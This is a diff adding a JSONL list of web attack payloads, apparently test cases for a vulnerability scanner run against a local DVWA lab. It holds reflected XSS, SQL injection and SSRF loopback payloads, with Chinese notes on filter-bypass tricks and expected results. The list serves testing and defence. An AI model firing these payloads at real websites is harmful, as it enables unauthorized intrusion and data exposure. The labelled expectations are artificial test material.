@@ -1,0 +1,44 @@
+{"id": "xss_r_001", "type": "xss_r", "payload": "<script>alert('{{NONCE}}')</script>", "severity": "high", "expected": "vuln", "note": "基础 script 标签，验证是否存在转义"}
+{"id": "xss_r_002", "type": "xss_r", "payload": "<ScRiPt>alert('{{NONCE}}')</ScRiPt>", "severity": "high", "expected": "vuln", "note": "大小写混淆，绕过基于小写正则的黑名单"}
+{"id": "xss_r_003", "type": "xss_r", "payload": "<img src=x onerror=alert('{{NONCE}}')>", "severity": "high", "expected": "vuln", "note": "事件属性型，不依赖 script 标签"}
+{"id": "xss_r_004", "type": "xss_r", "payload": "<svg/onload=alert('{{NONCE}}')>", "severity": "high", "expected": "vuln", "note": "SVG 标签自闭合 + 事件属性"}
+{"id": "xss_r_005", "type": "xss_r", "payload": "\"><script>alert('{{NONCE}}')</script>", "severity": "high", "expected": "vuln", "note": "双引号闭合属性后注入 script"}
+{"id": "xss_r_006", "type": "xss_r", "payload": "'><svg/onload=alert('{{NONCE}}')>", "severity": "high", "expected": "vuln", "note": "单引号闭合 + SVG 事件"}
+{"id": "xss_r_007", "type": "xss_r", "payload": "<body onload=alert('{{NONCE}}')>", "severity": "high", "expected": "vuln", "note": "body 事件属性型"}
+{"id": "xss_r_008", "type": "xss_r", "payload": "<a href=\"javascript:alert('{{NONCE}}')\">click</a>", "severity": "medium", "expected": "vuln", "note": "伪协议型，需用户交互，证明可注入可执行链接"}
+{"id": "xss_r_009", "type": "xss_r", "payload": "<svg><script>alert('{{NONCE}}')</script></svg>", "severity": "high", "expected": "vuln", "note": "SVG 命名空间内嵌 script"}
+{"id": "xss_r_010", "type": "xss_r", "payload": "<<script>alert('{{NONCE}}');//</script>", "severity": "high", "expected": "vuln", "note": "双写尖括号干扰标签匹配"}
+{"id": "xss_r_011", "type": "xss_r", "payload": "<scr<script>ipt>alert('{{NONCE}}')</script>", "severity": "high", "expected": "vuln", "note": "嵌套标签，针对单次替换式过滤"}
+{"id": "xss_r_012", "type": "xss_r", "payload": "<details open ontoggle=alert('{{NONCE}}')>", "severity": "high", "expected": "vuln", "note": "details/ontoggle 自动触发事件"}
+{"id": "xss_r_013", "type": "xss_r", "payload": "<iframe srcdoc=\"<script>alert('{{NONCE}}')</script>\">", "severity": "high", "expected": "vuln", "note": "srcdoc 内联文档执行脚本"}
+{"id": "xss_r_014", "type": "xss_r", "payload": "<img src=1 onerror=alert('{{NONCE}}')>", "severity": "high", "expected": "vuln", "note": "属性值不加引号，测试属性解析畸形"}
+{"id": "xss_r_015", "type": "xss_r", "payload": "\"><img src=x onerror=alert('{{NONCE}}')>", "severity": "high", "expected": "vuln", "note": "闭合后改用 img 事件"}
+{"id": "xss_r_016", "type": "xss_r", "payload": "<video><source onerror=alert('{{NONCE}}')>", "severity": "high", "expected": "vuln", "note": "video/source 事件型，覆盖少见标签"}
+{"id": "xss_r_017", "type": "xss_r", "payload": "&lt;script&gt;alert('{{NONCE}}')&lt;/script&gt;", "severity": "low", "expected": "clean", "note": "实体编码对照：浏览器不会解析为标签"}
+{"id": "xss_r_018", "type": "xss_r", "payload": "plain-text-{{NONCE}}", "severity": "low", "expected": "clean", "note": "纯文本对照：只验证回显，不构成注入"}
+{"id": "sqli_001", "type": "sqli", "payload": "1' OR '1'='1", "severity": "high", "expected": "vuln", "note": "恒真条件，返回全量记录"}
+{"id": "sqli_002", "type": "sqli", "payload": "1' OR 1=1-- -", "severity": "high", "expected": "vuln", "note": "注释符截断后半段查询"}
+{"id": "sqli_003", "type": "sqli", "payload": "1' OR 1=1#", "severity": "high", "expected": "vuln", "note": "井号注释，覆盖不同注释符"}
+{"id": "sqli_004", "type": "sqli", "payload": "1' AND '1'='2", "severity": "medium", "expected": "vuln", "note": "布尔为假，结果集为空，构成差分证据"}
+{"id": "sqli_005", "type": "sqli", "payload": "1' UNION SELECT 1,'{{NONCE}}'-- -", "severity": "high", "expected": "vuln", "note": "联合查询回显随机标记，2 列匹配"}
+{"id": "sqli_006", "type": "sqli", "payload": "-1' UNION SELECT 1,'{{NONCE}}'-- -", "severity": "high", "expected": "vuln", "note": "负值主查询置空，确保只回显注入行"}
+{"id": "sqli_007", "type": "sqli", "payload": "1' AND SLEEP(2)-- -", "severity": "high", "expected": "vuln", "note": "时间盲注，观察响应延迟"}
+{"id": "sqli_008", "type": "sqli", "payload": "1' AND IF(1=1,SLEEP(1),0)-- -", "severity": "high", "expected": "vuln", "note": "条件时间盲注，确认延迟由表达式触发"}
+{"id": "sqli_009", "type": "sqli", "payload": "1' AND updatexml(1,concat(0x7e,database()),1)-- -", "severity": "high", "expected": "vuln", "note": "报错注入，利用 XPath 报错回显库名"}
+{"id": "sqli_010", "type": "sqli", "payload": "1' AND extractvalue(1,concat(0x7e,database()))-- -", "severity": "high", "expected": "vuln", "note": "extractvalue 报错注入"}
+{"id": "sqli_011", "type": "sqli", "payload": "1' OR '1'='1' -- ", "severity": "high", "expected": "vuln", "note": "带空格的注释符，覆盖不同截断写法"}
+{"id": "sqli_012", "type": "sqli", "payload": "1' ORDER BY 3-- -", "severity": "medium", "expected": "vuln", "note": "列数探测，3 列越界触发报错"}
+{"id": "sqli_013", "type": "sqli", "payload": "1", "severity": "low", "expected": "clean", "note": "正常输入对照：应与基线一致"}
+{"id": "sqli_014", "type": "sqli", "payload": "abc", "severity": "low", "expected": "clean", "note": "非数字对照：仅返回空结果，不构成注入证据"}
+{"id": "sqli_015", "type": "sqli", "payload": "1' AND 1=2-- -", "severity": "medium", "expected": "vuln", "note": "恒假条件，结果集为空"}
+{"id": "ssrf_001", "type": "ssrf", "payload": "http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name={{NONCE}}", "severity": "high", "expected": "vuln", "note": "指向靶场内部反射页，用随机标记证明服务端确实抓取"}
+{"id": "ssrf_002", "type": "ssrf", "payload": "http://127.0.0.1/dvwa/", "severity": "high", "expected": "vuln", "note": "抓取本机 DVWA 首页"}
+{"id": "ssrf_003", "type": "ssrf", "payload": "http://127.0.0.1/dvwa/login.php", "severity": "high", "expected": "vuln", "note": "抓取本机登录页，验证内部页面可达"}
+{"id": "ssrf_004", "type": "ssrf", "payload": "http://localhost/dvwa/login.php", "severity": "high", "expected": "vuln", "note": "主机名写法绕过，覆盖 localhost 解析"}
+{"id": "ssrf_005", "type": "ssrf", "payload": "http://127.0.0.1:80/dvwa/", "severity": "high", "expected": "vuln", "note": "显式端口写法"}
+{"id": "ssrf_006", "type": "ssrf", "payload": "http://127.1/dvwa/login.php", "severity": "medium", "expected": "", "note": "回环地址省略写法；是否可解析取决于系统解析器，本机实测返回空响应，故不作标注"}
+{"id": "ssrf_007", "type": "ssrf", "payload": "http://2130706433/dvwa/", "severity": "medium", "expected": "", "note": "十进制回环地址，是否可解析取决于系统解析器，本机实测返回空响应，故不作标注"}
+{"id": "ssrf_008", "type": "ssrf", "payload": "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit", "severity": "medium", "expected": "vuln", "note": "抓取内部注入页面，响应包含用户表数据"}
+{"id": "ssrf_009", "type": "ssrf", "payload": "http://127.0.0.1/dvwa/vulnerabilities/exec/", "severity": "medium", "expected": "vuln", "note": "抓取内部命令执行页面，验证横向可达"}
+{"id": "ssrf_010", "type": "ssrf", "payload": "http://127.0.0.1:1/", "severity": "low", "expected": "clean", "note": "失败对照：未监听端口，服务端抓取应报错"}
+{"id": "ssrf_011", "type": "ssrf", "payload": "http://[::1]/dvwa/login.php", "severity": "high", "expected": "vuln", "note": "IPv6 回环写法，用于绕过只拦截 127.0.0.1 / localhost 的黑名单"}
